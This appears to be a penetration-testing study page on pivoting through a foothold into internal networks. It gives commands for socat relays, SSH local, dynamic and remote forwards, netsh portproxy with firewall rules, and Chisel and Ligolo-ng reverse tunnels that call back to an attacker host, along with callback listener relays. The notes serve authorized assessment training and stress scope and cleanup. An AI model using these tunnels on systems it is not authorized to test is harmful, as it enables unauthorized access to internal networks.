# Reach internal services

[Overview](../START.canvas) · [Browser map](../Map.html)

A tunnel moves traffic; it does not grant destination authorization. Draw listener location, connection initiator, remote destination, DNS resolution and return path separately.

## pivot-state

### Discover pivot interfaces, routes and internal service context

**Enter:** A foothold exposes an interface/subnet or a loopback-only service

**Discovery**

```text
ip addr
ip route
ss -lntup
```

**Interpret:** A second network or loopback listener supplies a new vantage candidate; forwarding is not automatically enabled.

**Still check:** Read interfaces/routes/listeners on the pivot and probe the internal destination from that host. Draw both legs and the initiator; only choose SSH/SOCKS/Ligolo after the destination leg works.

**Verify:** Record source, pivot, destination, protocol, listener placement and required return path.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#pivot-state)

### Full procedure and variants

```text
APPLICATION TOOL
  -> local listener / SOCKS endpoint / TUN route
  -> tunnel transport endpoint
  -> pivot exit
  -> internal destination service

CALLBACK TARGET
  -> pivot listener or routable address
  -> relay/tunnel
  -> final listener
```

Record:

```text
TOOL_HOST -> ENTRY_SOCKET/ROUTE -> TRANSPORT -> PIVOT -> DESTINATION
application protocol | TCP/UDP | initiator | bind address | DNS point
credential/SPN name | callback route | privilege | cleanup objects
```

Do not use “pivot works” as a single state. Confirm these layers separately:

1. the tunnel process started;
2. its listener/transport connection exists;
3. the pivot can reach the intended destination socket;
4. the local route, forward or proxy points at the right exit;
5. the application actually uses that path;
6. name resolution and authentication match the application;
7. a callback, if required, has its own return path.

Linux:

```bash
id
ip -brief address
ip route
ip neigh
ss -lntup
cat /etc/resolv.conf
```

Windows:

```cmd
whoami /all
ipconfig /all
route print
arp -a
netstat -ano
```

PowerShell selected endpoints:

```powershell
Get-NetIPConfiguration
Get-NetRoute -AddressFamily IPv4 | Sort-Object DestinationPrefix,RouteMetric
Get-NetTCPConnection -State Listen
Get-DnsClientServerAddress -AddressFamily IPv4
```

> An interface or route proves a possible network position, not destination reachability. Validate one justified socket from the pivot before building a tunnel.

```bash
nc -nvz -w 3 INTERNAL_HOST INTERNAL_PORT
curl -v --connect-timeout 5 http://INTERNAL_HOST:INTERNAL_PORT/
```

```powershell
Test-NetConnection INTERNAL_HOST -Port INTERNAL_PORT
```

| Need | Baseline | Choose when | Main limitation |
| --- | --- | --- | --- |
| One TCP service through an SSH pivot | SSH local forward | Kali can initiate SSH to pivot | One destination socket per forward |
| Many TCP destinations through SSH pivot | SSH dynamic forward | Kali can initiate SSH to pivot | SOCKS/client compatibility |
| Pivot can connect outward but inbound access is blocked | SSH remote or remote-dynamic forward | Pivot has OpenSSH client and can reach Kali SSH | Kali SSH policy; OpenSSH version for remote dynamic |
| SSH hop directly to internal SSH | `ProxyJump` | Both pivot and destination provide SSH | SSH-only path |
| Simple Linux TCP relay | Socat | Binary already exists and listener can be exposed | Clear TCP relay; no authentication/encryption |
| Transparent selected subnets through SSH | sshuttle | Suitable SSH server with Python; local privileges | TCP/DNS-oriented, local firewall changes |
| Windows SSH-based forward | Built-in `ssh.exe` or Plink | Compatible client exists and outbound SSH works | Server policy and credential/host-key handling |
| Windows native fixed TCP relay | `netsh interface portproxy` | Elevated token; target modification acceptable | TCP only; firewall/IP Helper/stateful cleanup |
| Outbound HTTP/WebSocket-shaped tunnel | Chisel | Pivot can run matching binary and reach server | Client/server compatibility and proxy/client transport limits |
| Routed access for ordinary clients | Ligolo-ng | Agent can reach proxy and TUN/route setup is possible | Userland stack is not identical to direct raw networking |
| DNS is the only viable egress | dnscat2 | DNS path plus authoritative/direct server control | Slow/noisy, infrastructure and client required |

Prefer one explicit forward for one known service. Use SOCKS when several TCP endpoints must be explored. Use a routed pivot when many ordinary tools must operate without proxy wrappers. Do not add a multi-host route when command execution directly on the pivot is sufficient.

Kali/Linux:

```bash
ss -lntup
ip -brief address
ip route
ps -ef | grep -E '[s]sh .*-[LDR]|[c]hisel|[l]igolo|[s]ocat|[s]shuttle'
```

Windows:

```cmd
netstat -ano
tasklist
netsh interface portproxy show all
netsh advfirewall firewall show rule name="OSCP Pivot LOCAL_PORT"
```

Record:

- exact process/command and version;
- bind address and port;
- transport direction and initiator;
- pivot and destination;
- routes/name mappings/configuration files added;
- simple TCP proof and final application proof;
- callback proof where applicable;
- cleanup command and result.

Stop tunnel processes and remove TUN routes, Ligolo listeners, temporary mappings, password files, Netsh rules and firewall exceptions after the authorized task.

### Follow the evidence

- [ Relay a single TCP service through a fixed forward](pivoting.md#fixed-forward) — One reachable pivot can connect to one internal TCP destination Required: A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity
- [ Forward a selected service through an SSH client-side listener](pivoting.md#ssh-local) — SSH reaches a server that can access the needed internal service Required: Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route
- [ Use a reverse Chisel SOCKS or fixed TCP tunnel](pivoting.md#chisel-reverse) — A pivot can make outbound HTTP/WebSocket connections to the tunnel server Required: Compatible reviewed client/server, server reverse mode, reachable server port and pivot-to-destination access
- [ Route a selected internal subnet through Ligolo-ng](pivoting.md#ligolo-route) — Several protocols/subnets require a route-style interface through an agent Required: Compatible proxy/agent, permitted local interface/route management, reachable carrier and selected assigned subnet
- [ Expose a server-side SOCKS proxy through remote dynamic SSH forwarding](pivoting.md#ssh-remote-dynamic) — Only the pivot can initiate SSH, but several client-selected internal destinations are needed Required: A supporting OpenSSH client, allowed remote forwarding, listener binding and SOCKS-compatible tool clients
- [ Route a selected subnet through sshuttle](pivoting.md#sshuttle-route) — Multiple internal TCP destinations need transparent application access over SSH Required: Working SSH/Python environment, local routing/firewall privileges and explicitly selected supported traffic/subnets
- [ Forward from Windows with OpenSSH, Plink or Netsh](pivoting.md#windows-forward) — The pivot is Windows and available networking utilities constrain the route Required: Compatible OpenSSH/Plink authentication or administrative Netsh/IP Helper context; correct listener and destination paths
- [ Use forward Chisel SOCKS and version-supported UDP routing](pivoting.md#chisel-forward) — The assessment-side client can reach a pivot-side tunnel server Required: Compatible client/server roles, reachable carrier, correctly placed SOCKS listener and explicitly supported UDP-aware mode when required
- [ Compose multiple pivots and validate every connection leg](pivoting.md#pivot-multihop) — A second internal network is reachable only from a later foothold Required: A working first route, explicit second carrier/listener directions and correct per-hop DNS/return paths
## fixed-forward

### Relay a single TCP service through a fixed forward

**Enter:** One reachable pivot can connect to one internal TCP destination

**Discovery**

```text
ip route get TARGET
ss -lnt
```

**Interpret:** A single TCP service can fit a fixed relay without assuming a full routed network.

**Still check:** Confirm both legs, bind address/permission and any additional dynamic ports or return path.

**Verify:** Verify application behavior through the listener and keep the transport's destination explicit.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#fixed-forward)

### Full procedure and variants

On a Linux pivot, expose one internal TCP service:

```bash
socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork \
  TCP:INTERNAL_HOST:INTERNAL_PORT
```

Loopback-only relay for another local tunnel stage:

```bash
socat -ddd TCP-LISTEN:LOCAL_PORT,bind=127.0.0.1,reuseaddr,fork \
  TCP:INTERNAL_HOST:INTERNAL_PORT
```

Verify the listener on the pivot with `ss -lntp | grep LOCAL_PORT`. Run `nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT` from the intended client to test client-to-pivot reachability. These checks run on different machines:

```bash
ss -lntp | grep LOCAL_PORT
nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT
```

> `fork` handles multiple connections. `reuseaddr` eases rebinding after restart. Socat does not add authentication or encryption to this relay; bind narrowly and remove the process when finished. A listener can exist even when the pivot-to-destination connection fails.

### Follow the evidence

- [ Use SQL Server rights, impersonation and command facilities](services.md#service-mssql) — SQL Server credentials or a Windows identity accepted by the database Required: Correct SQL versus Windows authentication; database role and configuration must permit the requested operation
- [ Use MySQL/MariaDB data and file primitives](services.md#service-mysql) — A MySQL-compatible service and valid application/database credentials Required: Database authentication and exact schema/file privileges; secure_file_priv and server filesystem identity constrain file actions
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
## ssh-local

### Forward a selected service through an SSH client-side listener

**Enter:** SSH reaches a server that can access the needed internal service

**Discovery**

```text
ssh -v -p SSH_PORT USER@PIVOT
ss -lnt
```

**Interpret:** Client-side listener plus server-side destination is the -L direction; destination loopback belongs to the SSH server.

**Still check:** Verify forwarding policy, local bind and server-to-destination application access.

**Verify:** Verify listening address plus the destination application's handshake and preserve correct hostname/SPN semantics when needed.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#ssh-local)

### Full procedure and variants

Run on Kali when Kali can SSH to the pivot:

```bash
ssh -N \
  -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \
  -p SSH_PORT USER@PIVOT \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
```

Use the listener as though it were the internal service:

```bash
nc -nvz 127.0.0.1 LOCAL_PORT
curl -v http://127.0.0.1:LOCAL_PORT/
```

> The SSH server/pivot resolves and connects to `INTERNAL_HOST`. Bind to `127.0.0.1` unless another authorized local host must use the forward; `-g` or a non-loopback bind expands exposure.

Add reliability and attributable failure to transport-only sessions:

```text
-N
-o ExitOnForwardFailure=yes
-o ServerAliveInterval=30
-o ServerAliveCountMax=3
```

`ExitOnForwardFailure` proves requested listening sockets were established. It does not prove the final destination is reachable through them.

### Follow the evidence

- [ Use MySQL/MariaDB data and file primitives](services.md#service-mysql) — A MySQL-compatible service and valid application/database credentials Required: Database authentication and exact schema/file privileges; secure_file_priv and server filesystem identity constrain file actions
- [ Use SQL Server rights, impersonation and command facilities](services.md#service-mssql) — SQL Server credentials or a Windows identity accepted by the database Required: Correct SQL versus Windows authentication; database role and configuration must permit the requested operation
- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
## ssh-dynamic

### Provide SOCKS access through SSH dynamic forwarding

**Enter:** Several internal TCP services need access through one SSH server

**Discovery**

```text
ssh -v -p SSH_PORT USER@PIVOT
```

**Interpret:** Multiple client-selected TCP destinations suggest a dynamic SOCKS listener rather than many fixed forwards.

**Still check:** Check SSH forwarding, listener bind, native/intercepted client support and DNS resolution location.

**Verify:** Verify one application through the proxy, then check each client's actual proxy and DNS behavior.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#ssh-dynamic)

### Full procedure and variants

```bash
ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
```

OpenSSH acts as a SOCKS4/5 server. The pivot makes destination connections selected by each SOCKS request.

### Follow the evidence

- [ Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](pivoting.md#proxy-clients) — A SOCKS listener or an SSH jump host is already available Required: Client/proxy transport compatibility, correct proxy configuration and controlled name resolution
- [ Discover TCP ports with SYN or connect scans](discovery.md#tcp-coverage) — An assigned host needs an initial service queue or full TCP coverage Required: SYN scanning needs raw-packet privileges; connect scanning needs OS TCP connections; specify selected versus full port coverage
- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
## ssh-remote

### Expose an SSH-client-side destination through a server-side remote listener

**Enter:** The useful side can initiate SSH outward but cannot accept an inbound management connection

**Discovery**

```text
ssh -v USER@SSH_SERVER
```

**Interpret:** The useful listener is on the SSH server while the destination is reached from the client side: a remote forward candidate.

**Still check:** Verify remote-forward permission, server bind/GatewayPorts policy and pivot-side destination reachability.

**Verify:** Verify listener placement/bind and actual destination application response.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#ssh-remote)

### Full procedure and variants

Run on a pivot that can initiate an SSH connection back to Kali:

```bash
ssh -N \
  -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT \
  -p KALI_SSH_PORT KALI_USER@LHOST \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
```

Kali then uses:

```bash
nc -nvz 127.0.0.1 KALI_PORT
```

> The SSH client/pivot connects to `INTERNAL_HOST`. `AllowTcpForwarding` and server policy must permit the forward. A non-loopback remote bind additionally depends on `GatewayPorts`; do not assume `0.0.0.0` was honored.

### Follow the evidence

- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
- [ Enumerate SMB/RPC shares, files and identities](services.md#service-smb) — SMB/RPC endpoints, domain clues or new credentials Required: Reachable SMB/RPC; anonymous, guest, local or domain context must be explicit; share and filesystem ACLs both matter
- [ Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback) — A pivoted exploit reaches its target but its shell/download cannot return Required: Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward
## ssh-remote-dynamic

### Expose a server-side SOCKS proxy through remote dynamic SSH forwarding

**Enter:** Only the pivot can initiate SSH, but several client-selected internal destinations are needed

**Discovery**

```text
ssh -V
```

**Interpret:** Remote listener placement plus per-connection SOCKS destination selection suggests remote dynamic forwarding.

**Still check:** Check implementation support, remote-forward policy, listener binding and proxy-client/DNS compatibility.

**Verify:** Verify the listener's actual location and source-side exit by application evidence.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#ssh-remote-dynamic)

### Full procedure and variants

Run on the pivot:

```bash
ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 -o ServerAliveCountMax=3
```

The SOCKS listener appears on Kali and destination connections exit through the pivot. Remote dynamic forwarding requires OpenSSH 7.6 or later on the client that issues `-R`. Run `ssh -V` on the pivot (the SSH client). Run `ss -lntp | grep 1080` on Kali (the SSH server hosting the SOCKS listener). These checks run on different machines; do not paste both into one terminal:

```bash
ssh -V
ss -lntp | grep 1080
```

### Follow the evidence

- [ Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](pivoting.md#proxy-clients) — A SOCKS listener or an SSH jump host is already available Required: Client/proxy transport compatibility, correct proxy configuration and controlled name resolution
- [ Expose an SSH-client-side destination through a server-side remote listener](pivoting.md#ssh-remote) — The useful side can initiate SSH outward but cannot accept an inbound management connection Required: Outbound SSH route, accepted identity, server forwarding/GatewayPorts policy and reachability to the chosen client-side destination
- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
## proxy-clients

### Use ProxyChains, native SOCKS clients and SSH jump paths appropriately

**Enter:** A SOCKS listener or an SSH jump host is already available

**Discovery**

```text
curl --socks5-hostname 127.0.0.1:SOCKS_PORT http://TARGET:PORT/
```

**Interpret:** One supported TCP application works; the proxy does not automatically carry raw packets or arbitrary DNS/UDP.

**Still check:** Check native versus intercepted support, connect-only scanner modes, name resolution and every required protocol leg.

**Verify:** Verify destination application and resolver behavior through the intended path.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#proxy-clients)

### Full procedure and variants

Direct SSH through an SSH pivot:

```bash
ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST
```

SSH through an existing SOCKS5 endpoint with Ncat:

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \
  TARGET_USER@INTERNAL_HOST
```

`%h` and `%p` are replaced with the destination host and port. Prefer this native proxy route when ProxyChains interposition is unreliable.

<details>
<summary><strong>Use an SSH configuration for repeated access</strong></summary>

```sshconfig
Host pivot
  HostName PIVOT
  User PIVOT_USER

Host internal
  HostName INTERNAL_HOST
  User TARGET_USER
  ProxyJump pivot
```

```bash
ssh internal
scp FILE internal:DESTINATION_PATH
```

</details>

Use a task-specific configuration rather than repeatedly editing a shared global file:

```text
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/
proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST
proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \
  'DOMAIN/USER:PASSWORD@INTERNAL_HOST'
```

Constraints:

- ProxyChains hooks socket calls in dynamically linked programs; some static binaries, scripts, child processes or dynamically loaded modules bypass or break the hook.
- ProxyChains supports TCP only. It does not proxy UDP, ICMP, SYN scans or pcap-based discovery.
- For Nmap use `-sT -Pn -n` with a focused port list. Proxy scanning is slow and is not a replacement for discovery from the pivot.
- `proxy_dns` moves supported hostname resolution through the proxy, but application behavior varies. `-n` prevents Nmap's local reverse lookups.
- Prefer an application's native proxy option when available.

Native examples:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/
ncat --proxy-type socks5 --proxy 127.0.0.1:1080 INTERNAL_HOST INTERNAL_PORT
```

### Follow the evidence

- [ Discover TCP ports with SYN or connect scans](discovery.md#tcp-coverage) — An assigned host needs an initial service queue or full TCP coverage Required: SYN scanning needs raw-packet privileges; connect scanning needs OS TCP connections; specify selected versus full port coverage
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
- [ Route a selected internal subnet through Ligolo-ng](pivoting.md#ligolo-route) — Several protocols/subnets require a route-style interface through an agent Required: Compatible proxy/agent, permitted local interface/route management, reachable carrier and selected assigned subnet
## sshuttle-route

### Route a selected subnet through sshuttle

**Enter:** Multiple internal TCP destinations need transparent application access over SSH

**Discovery**

```text
ssh -v USER@PIVOT
python3 --version
ip route
```

**Interpret:** An SSH carrier and compatible endpoints make a transparent selected-subnet route a candidate; local Python output alone does not prove the remote runtime.

**Still check:** Verify local route/firewall permissions, remote runtime, supported transport/mode and explicitly selected subnet/DNS behavior.

**Verify:** Verify the actual application path and ensure only assigned subnets are selected.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#sshuttle-route)

### Full procedure and variants

```bash
sudo sshuttle --dns \
  -r SSH_USER@PIVOT:SSH_PORT \
  INTERNAL_SUBNET ANOTHER_SUBNET
```

Through a previously established local forward to the SSH pivot:

```bash
sudo sshuttle --dns \
  -r SSH_USER@127.0.0.1:LOCAL_SSH_PORT \
  INTERNAL_SUBNET
```

> sshuttle is useful when many TCP clients need transparent access. It requires privileges and firewall/redirection support on the client; the remote side needs a compatible Python execution path. It is not a general layer-2 VPN and does not make arbitrary raw-packet or UDP behavior equivalent to direct routing. Record the selected subnets so existing VPN routes are not accidentally captured.

### Follow the evidence

- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
- [ Provide SOCKS access through SSH dynamic forwarding](pivoting.md#ssh-dynamic) — Several internal TCP services need access through one SSH server Required: SSH forwarding allowed and clients that support SOCKS or compatible interception; DNS behavior must be chosen explicitly
## windows-forward

### Forward from Windows with OpenSSH, Plink or Netsh

**Enter:** The pivot is Windows and available networking utilities constrain the route

**Discovery**

```text
Get-Command ssh,plink,netsh -ErrorAction SilentlyContinue
Get-Service iphlpsvc
Test-NetConnection TARGET -Port PORT
```

**Interpret:** Windows has a carrier/destination candidate; Netsh administrative state and user-space SSH requirements differ.

**Still check:** Choose the supported tool, verify listener/bind/firewall and correct connection direction; check its exact rights.

**Verify:** Verify actual listener, route and application, then remove created portproxy/firewall state as appropriate.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#windows-forward)

### Full procedure and variants

##### 8.1 Built-in OpenSSH client

```cmd
where ssh.exe
ssh.exe -V
ssh.exe -N -R 127.0.0.1:1080 KALI_USER@LHOST -p KALI_SSH_PORT -o ExitOnForwardFailure=yes -o ServerAliveInterval=30
```

The same `-L`, `-D`, `-R`, `ProxyJump` and `ProxyCommand` concepts apply to current Windows OpenSSH. Remote dynamic forwarding depends on the client version.

##### 8.2 Plink

Remote fixed forward from Windows to Kali:

```cmd
plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^
  -l KALI_USER -pwfile C:\PATH\kali-password.txt ^
  -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT ^
  -P KALI_SSH_PORT LHOST
```

Local dynamic SOCKS on Windows:

```cmd
plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^
  -l SSH_USER -pwfile C:\PATH\ssh-password.txt ^
  -D 127.0.0.1:1080 -P SSH_PORT PIVOT
```

> Current Plink supports `-L`, `-R` and `-D`, but not OpenSSH's remote-dynamic shorthand. `-batch` prevents an unseen prompt from hanging; pair it with a verified `-hostkey`. `-pwfile` avoids a literal password in the command line but creates a sensitive file that must be protected and removed. Prefer a key or existing authenticated context where feasible.

##### 8.3 Netsh portproxy

Elevated Windows shell:

```cmd
netsh interface portproxy add v4tov4 ^
  listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT ^
  connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT

netsh interface portproxy show all
netstat -ano -p tcp | findstr ":LOCAL_PORT"
```

If the existing firewall policy does not already allow the listener and a change is authorized:

```cmd
netsh advfirewall firewall add rule name="OSCP Pivot LOCAL_PORT" ^
  dir=in action=allow protocol=TCP localport=LOCAL_PORT
```

Cleanup:

```cmd
netsh interface portproxy delete v4tov4 ^
  listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT

netsh advfirewall firewall delete rule name="OSCP Pivot LOCAL_PORT"
```

> `portproxy` requires an elevated token, forwards TCP rather than UDP, modifies persistent host configuration and may depend on the IP Helper service. A stored rule or listening socket still does not prove the destination is reachable. Record and remove both the proxy and any firewall rule.

### Follow the evidence

- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
- [ Forward a selected service through an SSH client-side listener](pivoting.md#ssh-local) — SSH reaches a server that can access the needed internal service Required: Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route
- [ Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback) — A pivoted exploit reaches its target but its shell/download cannot return Required: Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward
## chisel-reverse

### Use a reverse Chisel SOCKS or fixed TCP tunnel

**Enter:** A pivot can make outbound HTTP/WebSocket connections to the tunnel server

**Discovery**

```text
chisel --version
chisel server --help
chisel client --help
```

**Interpret:** The outbound carrier and server-side listener requirement identify a reverse-tunnel topology.

**Still check:** Verify server reverse mode, fingerprint, carrier upgrade, listener bind and pivot-to-destination compatibility.

**Verify:** Verify tunnel establishment and end-to-end application behavior; a connected carrier alone is insufficient.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#chisel-reverse)

### Full procedure and variants

On Kali:

```bash
chisel server --reverse --port CHISEL_PORT
```

Record the server fingerprint. On the pivot:

```bash
chisel client --fingerprint 'SERVER_FINGERPRINT' \
  LHOST:CHISEL_PORT R:127.0.0.1:1080:socks
```

`R:socks` is the shorter equivalent using the default server-side `127.0.0.1:1080` listener. Traffic sent to Kali's SOCKS listener exits through the Chisel client/pivot.

```bash
# Kali
chisel server --reverse --port CHISEL_PORT

# Pivot: expose an internal service on Kali loopback
chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT \
  R:127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT
```

```bash
chisel --version
chisel server --help
chisel client --help
ss -lntp
```

| Cue | Interpretation |
| --- | --- |
| No connection at server | Pivot egress, address, listener or WebSocket/proxy path |
| HTTP reaches server but upgrade fails | Intermediary may block WebSocket upgrade |
| `exec format error` | Wrong OS/architecture |
| Missing GLIBC/version symbol | Build/runtime incompatibility; choose a compatible official build |
| Fingerprint mismatch | Wrong server or changed key; do not bypass verification blindly |
| SOCKS listener exists but endpoint fails | Pivot-to-destination or application/proxy compatibility |
| TCP works but UDP fails | Ordinary `socks`, old peer, UDP bind/firewall or unsupported client |

### Follow the evidence

- [ Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](pivoting.md#proxy-clients) — A SOCKS listener or an SSH jump host is already available Required: Client/proxy transport compatibility, correct proxy configuration and controlled name resolution
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
## chisel-forward

### Use forward Chisel SOCKS and version-supported UDP routing

**Enter:** The assessment-side client can reach a pivot-side tunnel server

**Discovery**

```text
chisel --version
chisel client --help
```

**Interpret:** Forward placement and actual client transport determine the mode; a UDP-capable tunnel binary does not make every wrapper UDP-capable.

**Still check:** Verify compatible peers, server SOCKS setting, listener route and the real application's UDP/TCP support.

**Verify:** Verify the actual required transport end to end, with correct listener/exit placement.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#chisel-forward)

### Full procedure and variants

```bash
# Pivot/server side
chisel server --socks5 --port CHISEL_PORT

# Kali/client side
chisel client --fingerprint 'SERVER_FINGERPRINT' PIVOT:CHISEL_PORT \
  127.0.0.1:1080:socks
```

Current upstream Chisel distinguishes:

```text
socks / R:socks       -> SOCKS5 TCP CONNECT only
udpsocks / R:udpsocks -> TCP CONNECT plus SOCKS5 UDP ASSOCIATE
```

```bash
# Requires compatible current peers
chisel client --fingerprint 'SERVER_FINGERPRINT' \
  LHOST:CHISEL_PORT R:127.0.0.1:1080:udpsocks
```

> This does not make ProxyChains UDP-capable—ProxyChains remains TCP-only. The UDP application must support SOCKS5 UDP ASSOCIATE, or another compatible adapter must be used. Current Chisel peers, TCP and UDP firewall access to the SOCKS listener, and its documented association/fragmentation limits all matter.

### Follow the evidence

- [ Route a selected internal subnet through Ligolo-ng](pivoting.md#ligolo-route) — Several protocols/subnets require a route-style interface through an agent Required: Compatible proxy/agent, permitted local interface/route management, reachable carrier and selected assigned subnet
- [ Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](pivoting.md#proxy-clients) — A SOCKS listener or an SSH jump host is already available Required: Client/proxy transport compatibility, correct proxy configuration and controlled name resolution
- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
## ligolo-route

### Route a selected internal subnet through Ligolo-ng

**Enter:** Several protocols/subnets require a route-style interface through an agent

**Discovery**

```text
ip route
ip link
./proxy -h
```

**Interpret:** A selected internal network and proxy-incompatible client suggest a route-style agent, subject to its own transport behavior.

**Still check:** Verify compatible proxy/agent, local privileges, carrier, selected route/interface, DNS and any separate reverse listener.

**Verify:** Verify route/interface ownership, destination application and each necessary reverse listener.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#ligolo-route)

### Full procedure and variants

##### 10.1 Proxy and agent

On Kali:

```bash
./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT
```

In the proxy console, obtain the fingerprint:

```text
certificate_fingerprint
```

On the pivot:

```bash
./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT
```

`-ignore-cert` is a controlled-lab/debug fallback, not the baseline.

##### 10.2 Current managed interface and route

In the Ligolo console:

```text
interface_create --name ligolo
session
ifconfig
interface_add_route --name ligolo --route INTERNAL_SUBNET
tunnel_start --tun ligolo
```

Manual Linux alternative:

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
sudo ip route add INTERNAL_SUBNET dev ligolo
```

Then use normal clients:

```bash
ip route get INTERNAL_HOST
nmap -sT -Pn -n -p PORTS INTERNAL_HOST
curl -v http://INTERNAL_HOST:PORT/
```

> Ligolo translates connections through a userland network stack. Ordinary TCP clients generally work without ProxyChains, but raw-packet assumptions, ICMP details and some UDP behavior can differ from direct access. Use connect-based validation first.

##### 10.3 Pivot loopback services

Ligolo maps its special `240.0.0.0/4` range to the selected agent's loopback. Add one narrow route:

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
nmap -sT -Pn -n -p PORTS 240.0.0.1
```

Use this only when the desired service is bound to `127.0.0.1` on the agent.

##### 10.4 Callback or file-server listener on the agent

In the selected Ligolo session:

```text
listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp
listener_list
```

Kali listener:

```bash
ncat -lvn 127.0.0.1 KALI_PORT
```

An internal target connects to `PIVOT_REACHABLE_IP:PIVOT_PORT`; Ligolo relays it to Kali's loopback listener. Cleanup:

```text
listener_stop LISTENER_ID
```

### Follow the evidence

- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
